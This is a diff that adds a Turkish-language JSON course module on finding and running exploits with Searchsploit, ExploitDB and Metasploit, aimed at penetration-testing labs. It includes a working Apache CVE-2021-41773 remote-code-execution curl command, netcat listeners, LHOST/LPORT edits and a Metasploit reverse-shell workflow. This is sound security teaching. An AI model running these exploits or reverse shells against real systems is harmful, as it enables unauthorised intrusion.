@@ -1,0 +1,192 @@
+{
+  "id": "searchsploit",
+  "slug": "searchsploit",
+  "title": "Searchsploit & ExploitDB",
+  "subtitle": "Versiyon Buldun — Şimdi Exploit Bul",
+  "description": "Nmap'te OpenSSH 7.2 gördün, sıra ne? Searchsploit ile ExploitDB'yi tara, PoC'yi oku-anla-uyarla ve çalıştır. Junior'ın en sık takıldığı 'versiyon → exploit' köprüsünü kur.",
+  "team": "red-team",
+  "category": "Sömürü (Exploitation)",
+  "phase": "Exploitation",
+  "icon": "🎯",
+  "color": "#f97316",
+  "tags": ["searchsploit", "exploitdb", "cve", "poc", "exploit", "metasploit", "msfconsole", "vulnerability-research", "edb"],
+  "modules": [
+    {
+      "id": "searchsploit-temeller",
+      "title": "Searchsploit Temelleri",
+      "description": "ExploitDB nedir, searchsploit nasıl kurulur, temel arama ve sonuç okuma.",
+      "difficulty": "beginner",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "ExploitDB ve Searchsploit Nedir?",
+          "content": "**ExploitDB** (exploit-db.com), kamuya açık exploitlerin ve PoC (Proof of Concept) kodlarının en büyük veritabanıdır. Offensive Security tarafından yönetilir.\n\n**Searchsploit**, ExploitDB'nin offline CLI aracıdır — internet bağlantısı olmadan lokal kopya üzerinden arama yaparsın.\n\n**Pentest akışındaki yeri:**\n```\nnmap -sV → OpenSSH 7.2p2\n          ↓\n  searchsploit openssh 7.2\n          ↓\n  İlgili CVE/exploit listesi\n          ↓\n  PoC indir → incele → uyarla → çalıştır\n```\n\n**Exploit türleri (ExploitDB'de):**\n| Tür | Açıklama |\n|-----|----------|\n| Remote | Ağ üzerinden uzaktan sömürü |\n| Local | Hedefte shell varken PrivEsc |\n| DoS | Servis çökertme (genellikle istenmez) |\n| WebApps | Web uygulama zafiyetleri |\n| Shellcode | Hazır shellcode (exploit içine gömülür) |"
+        },
+        {
+          "id": "kurulum",
+          "type": "installation",
+          "title": "Kurulum",
+          "installation": {
+            "note": "Kali Linux'ta önceden yüklüdür. Veritabanını güncel tut.",
+            "linux": [
+              "# Kali'de zaten yüklü — güncelle:",
+              "sudo apt update && sudo apt install exploitdb -y",
+              "",
+              "# Veritabanını güncelle:",
+              "searchsploit -u",
+              "",
+              "# Versiyon ve veritabanı konumu:",
+              "searchsploit --version"
+            ],
+            "windows": [
+              "# Windows'ta searchsploit yoktur — WSL veya Kali VM kullan",
+              "# Web arayüzü: https://www.exploit-db.com"
+            ]
+          }
+        },
+        {
+          "id": "temel-komutlar",
+          "type": "commands",
+          "title": "Temel Arama Komutları",
+          "commands": [
+            {
+              "command": "# Basit arama:\nsearchsploit openssh 7.2\n\n# Çoklu terim (VE mantığı):\nsearchsploit apache 2.4 remote\n\n# Kesin versiyon eşleşmesi:\nsearchsploit -e 'Apache 2.4.18'\n\n# Başlıkta geçmesi yeterli:\nsearchsploit --exclude='dos' openssh",
+              "description": "Temel searchsploit aramaları — araçtan çıkan versiyon bilgisini direkt yapıştır.",
+              "output": "----------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                     |  Path\n----------------------------------------------------------------------------------- ---------------------------------\nOpenSSH 2.3 < 7.7 - Username Enumeration                                          | linux/remote/45233.py\nOpenSSH 7.2 - Denial of Service                                                   | linux/dos/40888.py\nOpenSSH 7.2p1 - (Authenticated) xauth Command Injection                           | multiple/remote/39569.py\nOpenSSH 7.2p2 - Username Enumeration                                              | linux/remote/40136.py\n----------------------------------------------------------------------------------- ---------------------------------\n\nShellcodes: No Results",
+              "tip": "Sürüm numarasını tam yazma — 7.2p2 yerine 7.2 yaz. Daha geniş sonuç alırsın."
+            },
+            {
+              "command": "# Exploit'i detaylı görüntüle (indirmeden):\nsearchsploit -x linux/remote/40136.py\n\n# Exploiti çalışma dizinine kopyala:\nsearchsploit -m linux/remote/40136.py\n\n# Tam yolu göster:\nsearchsploit -p linux/remote/40136.py",
+              "description": "-x ile exploit içeriğini oku, -m ile kopyala (m = mirror).",
+              "tip": "-x ile ilk önce okumak şart — exploit ne yapıyor, nasıl çalışıyor, neye ihtiyacı var?"
+            },
+            {
+              "command": "# Nmap çıktısından direkt arama:\nnmap -sV 10.10.10.1 -oX scan.xml\nsearchsploit --nmap scan.xml\n\n# JSON formatında arama:\nsearchsploit -j apache 2.4 | python3 -m json.tool",
+              "description": "--nmap ile Nmap XML çıktısını ver, searchsploit otomatik tüm servisler için exploit arar.",
+              "tip": "Bu komut çok gürültülü çıktı verebilir — sonuçları filtrele. Remote ve WebApps exploit'lere odaklan."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "poc-okuma-uyarlama",
+      "title": "PoC Okuma, Anlama ve Uyarlama",
+      "description": "İndirilen exploit kodunu oku, ne yaptığını anla, IP/port değiştir, bağımlılıkları kur ve çalıştır.",
+      "difficulty": "intermediate",
+      "duration": "35 dk",
+      "sections": [
+        {
+          "id": "poc-theory",
+          "type": "theory",
+          "title": "PoC Okumanın Adımları — Her Exploit'te Aynı Akış",
+          "content": "Bir exploit indirdiğinde paniklemeden şu sırayı uygula:\n\n**1. Ne yapıyor?** → Dosyanın başındaki yorumları oku.\n```\n# Exploit Title: Apache 2.4.49 - Path Traversal & RCE\n# CVE: CVE-2021-41773\n# Tested on: Apache 2.4.49 + mod_cgi enabled\n# Usage: python3 exploit.py http://hedef.com\n```\n\n**2. Ne istiyor?** → Değiştirilmesi gereken yerler:\n- Hedef IP/URL\n- Saldırgan IP/port (reverse shell için)\n- Kimlik bilgileri (authenticated exploit)\n- Özel payload\n\n**3. Bağımlılıklar neler?** → Import satırlarına bak.\n```python\nimport requests  # pip3 install requests\nimport paramiko  # pip3 install paramiko\n```\n\n**4. Test ortamı emin misin?** → Hedef gerçekten bu versiyonu mu çalıştırıyor?\n\n**5. Çalıştır, sonucu incele.** Hata varsa Python/lib versiyonunu kontrol et."
+        },
+        {
+          "id": "poc-komutlar",
+          "type": "commands",
+          "title": "PoC İndirme, Uyarlama ve Çalıştırma",
+          "commands": [
+            {
+              "command": "# 1. Exploit'i kopyala:\nsearchsploit -m linux/remote/40136.py\nls -la 40136.py\n\n# 2. İçeriği oku:\ncat 40136.py\n# veya:\nsearchsploit -x linux/remote/40136.py",
+              "description": "Exploit'i önce oku — kör kör çalıştırma. Ne yaptığını anlamadan çalıştırmak hem tehlikeli hem işe yaramaz.",
+              "tip": "ExploitDB'deki exploit'lerin bir kısmı kasıtlı hatalı veya eksik bırakılmış (güvenlik için). Bazen küçük düzeltmeler gerekir."
+            },
+            {
+              "command": "# Örnek: CVE-2021-41773 Apache Path Traversal PoC uyarlama\n# searchsploit apache 2.4.49\n# searchsploit -m 50383.sh\n\ncat 50383.sh\n# İçerik:\n# #!/bin/bash\n# TARGET=$1\n# curl -s --path-as-is -d 'echo;id' \"${TARGET}/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh\"\n\n# Çalıştır:\nchmod +x 50383.sh\n./50383.sh http://10.10.10.1",
+              "description": "Basit bash PoC uyarlama — parametreye hedef URL'i ver, çalıştır.",
+              "output": "uid=1(daemon) gid=1(daemon) groups=1(daemon)\n# → RCE onaylandı, apache daemon olarak çalışıyor"
+            },
+            {
+              "command": "# Python PoC'de IP/port değiştirme örneği:\n# İndirilen exploit.py içinde şunu ara:\ngrep -n 'LHOST\\|lhost\\|attacker\\|reverse\\|callback\\|your_ip\\|10.0.0' exploit.py\n\n# Bulunca sed ile değiştir:\nsed -i 's/LHOST = .*/LHOST = \"10.10.14.5\"/' exploit.py\nsed -i 's/LPORT = .*/LPORT = 4444/' exploit.py\n\n# Bağımlılıkları kur:\nhead -20 exploit.py | grep import\npip3 install requests paramiko\n\n# Dinleyiciyi aç (başka terminalde):\nnc -lvnp 4444\n\n# Çalıştır:\npython3 exploit.py 10.10.10.1",
+              "description": "Python PoC'de saldırgan IP/port'u değiştirme — grep ile bul, sed ile değiştir.",
+              "tip": "Bazı PoC'lerde LHOST/LPORT yok — kodu okuyunca 'connect back' veya shell komutunu bulup manuel değiştirirsin."
+            },
+            {
+              "command": "# PoC çalışmıyorsa debug:\n# 1. Python versiyonu kontrol:\npython3 exploit.py --help 2>&1 | head\n\n# 2. Syntax hatası var mı:\npython3 -m py_compile exploit.py && echo 'Syntax OK'\n\n# 3. Hedef doğru versiyon mu?\ncurl -I http://10.10.10.1 | grep -i server\n\n# 4. Exploit GitHub'da güncel versiyonu var mı?\n# EDB numarası ile GitHub'da ara: 'edb-id:50383'\n\n# 5. Manuel test et — curl/nc ile exploit'in HTTP isteğini taklit et",
+              "description": "PoC çalışmıyor — sistematik debug adımları.",
+              "tip": "ExploitDB'deki Python2 exploit'lerini Python3'e çevirmek sık karşılaşılan sorun: print '' → print('') , urllib2 → urllib.request"
+            }
+          ]
+        },
+        {
+          "id": "web-exploitdb",
+          "type": "commands",
+          "title": "exploit-db.com Web Arayüzü ve CVE Araştırma",
+          "commands": [
+            {
+              "command": "# Web arayüzünde arama:\n# https://www.exploit-db.com/?type=remote&platform=linux\n\n# CVE numarasıyla ara:\n# https://www.exploit-db.com/search?cve=2021-41773\n\n# CVSS skoru yüksek CVE'leri bul:\n# https://nvd.nist.gov/vuln/search\n# Search: 'OpenSSH 7.2' → CVSS 9.0+ olanlar\n\n# GitHub'da PoC ara:\n# https://github.com/search?q=CVE-2021-41773+poc\n# veya: https://www.google.com/search?q=CVE-2021-41773+github+poc",
+              "description": "ExploitDB web arayüzü ve CVE araştırma akışı — çoğu zaman GitHub'da daha güncel PoC bulunur.",
+              "tip": "packetstormsecurity.com ve GitHub'da searchsploit'te olmayan PoC'ler bulunabilir. 'CVE-XXXX-XXXXX poc site:github.com' arama kalıbı çok işe yarar."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "msf-exploit-workflow",
+      "title": "Metasploit ile Exploit Arama ve Çalıştırma",
+      "description": "msfconsole'da search, use, options set ve run ile sistematik exploit kullanımı.",
+      "difficulty": "intermediate",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "msf-theory",
+          "type": "theory",
+          "title": "ExploitDB vs Metasploit — Ne Zaman Hangisi?",
+          "content": "| Durum | Tercih |\n|-------|--------|\n| Hızlı çalışan, hazır modül var | Metasploit |\n| Özel, manuel ayar gerekli | ExploitDB PoC |\n| OSCP sınavında belirli makine | ExploitDB (MSF kısıtı var) |\n| CTF'de hız önemli | Metasploit |\n| Neden çalıştığını anlamak için | ExploitDB PoC |\n\n**Altın kural:** Önce searchsploit, sonra MSF'de ara. İkisinde de varsa önce MSF'yi dene (daha kararlı), sonra manuel PoC."
+        },
+        {
+          "id": "msf-komutlar",
+          "type": "commands",
+          "title": "Metasploit Exploit Arama ve Kullanım",
+          "commands": [
+            {
+              "command": "msfconsole -q\n\n# Servis adıyla ara:\nmsf6> search openssh\nmsf6> search type:exploit platform:linux name:apache\n\n# CVE numarasıyla ara:\nmsf6> search cve:2021-41773\n\n# Rank'e göre filtrele (excellent en güvenilir):\nmsf6> search rank:excellent apache",
+              "description": "msfconsole içinde exploit arama — CVE, servis adı veya platform filtresiyle.",
+              "output": "Matching Modules\n================\n\n   #  Name                                       Disclosure Date  Rank       Check  Description\n   -  ----                                       ---------------  ----       -----  -----------\n   0  exploit/multi/http/apache_normalize_path   2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE",
+              "tip": "Rank sıralaması: excellent > great > good > normal > average > low. 'excellent' olanları öncelikle dene."
+            },
+            {
+              "command": "# Exploit'i seç ve yapılandır:\nmsf6> use exploit/multi/http/apache_normalize_path\n# veya numara ile:\nmsf6> use 0\n\n# Gerekli seçenekleri gör:\nmsf6 exploit(...)> show options\n\n# Seçenekleri ayarla:\nmsf6 exploit(...)> set RHOSTS 10.10.10.1\nmsf6 exploit(...)> set RPORT 80\nmsf6 exploit(...)> set LHOST 10.10.14.5\nmsf6 exploit(...)> set LPORT 4444\n\n# Payload seç (meterpreter veya bash):\nmsf6 exploit(...)> set payload linux/x64/meterpreter/reverse_tcp\n# Basit shell için:\nmsf6 exploit(...)> set payload cmd/unix/reverse_bash\n\n# Hedef açık mı kontrol:\nmsf6 exploit(...)> check\n\n# Çalıştır:\nmsf6 exploit(...)> run",
+              "description": "Tam Metasploit exploit iş akışı — use, options, set, check, run.",
+              "output": "[*] Started reverse TCP handler on 10.10.14.5:4444\n[*] Running automatic check (\"set AutoCheck false\" to disable)\n[+] The target is vulnerable.\n[*] Triggering the vulnerability...\n[*] Sending stage (3045380 bytes) to 10.10.10.1\n[*] Meterpreter session 1 opened\n\nmeterpreter > getuid\nServer username: daemon",
+              "tip": "show payloads → mevcut payload listesi. linux/x64/shell/reverse_tcp basit shell, linux/x64/meterpreter/reverse_tcp tam özellikli meterpreter."
+            }
+          ]
+        },
+        {
+          "id": "workflow-lab",
+          "type": "lab",
+          "title": "Lab: Nmap → Searchsploit → Exploit → Shell",
+          "scenario": {
+            "title": "Tam Versiyon-to-Shell Zinciri",
+            "objective": "Nmap ile servis versiyonlarını bul, searchsploit ile exploit ara, PoC'yi uyarla veya Metasploit kullan ve hedefte shell al.",
+            "environment": "HTB: Lame (vsftpd 2.3.4 backdoor, Samba 3.0.20) | HTB: Legacy (MS08-067) | TryHackMe: 'Vulnversity', 'Blue' odaları | Metasploitable2 (VMware)",
+            "difficulty": "beginner",
+            "steps": [
+              "nmap -sV -sC 10.10.10.1 ile servis versiyonlarını al",
+              "Her servis için searchsploit ile ara: searchsploit vsftpd 2.3.4",
+              "Bulunan exploit'leri -x ile oku, en uygun olanı seç",
+              "searchsploit -m ile kopyala, IP/port bilgilerini güncelle",
+              "Gerekli bağımlılıkları pip3 ile kur",
+              "nc -lvnp 4444 ile listener aç (reverse shell exploitlerde)",
+              "python3 exploit.py 10.10.10.1 ile çalıştır",
+              "Alternatif: msfconsole'da search → use → set → run"
+            ],
+            "hints": [
+              "vsftpd 2.3.4 → searchsploit vsftpd 2.3.4 → backdoor payload :) kullanıcı adı + smiley",
+              "Samba 3.0.20 → MS-RPC Shell → msf: exploit/multi/samba/usermap_script",
+              "MS08-067 → msf: exploit/windows/smb/ms08_067_netapi → Windows XP/2003",
+              "PoC Python2 ise: python2 exploit.py (Kali'de python2 hala var)"
+            ],
+            "flag": "/root/root.txt veya C:\\Documents and Settings\\Administrator\\Desktop\\root.txt",
+            "defenseNote": "Savunma: Servisleri güncel tut (en kritik önlem). Ağ segmentasyonu — internet'ten erişilmemesi gereken servisler firewall arkasında. Nessus/OpenVAS ile düzenli zafiyet taraması. Patch management pipeline kur."
+          }
+        }
+      ]
+    }
+  ]
+}
